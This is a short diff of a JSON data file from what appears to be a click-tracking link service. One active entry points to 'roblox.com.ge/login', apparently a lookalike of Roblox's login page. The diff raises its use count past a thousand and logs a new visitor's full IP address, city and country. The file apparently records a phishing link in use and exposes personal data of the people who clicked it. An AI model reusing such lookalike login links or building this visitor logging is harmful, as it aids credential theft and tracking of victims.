@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1006,
+    "useCount": 1007,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8168,6 +8168,14 @@
         "city": "Treze Tílias",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777224648092,
+        "ip": "176.143.107.76",
+        "country": "France",
+        "city": "Honfleur",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
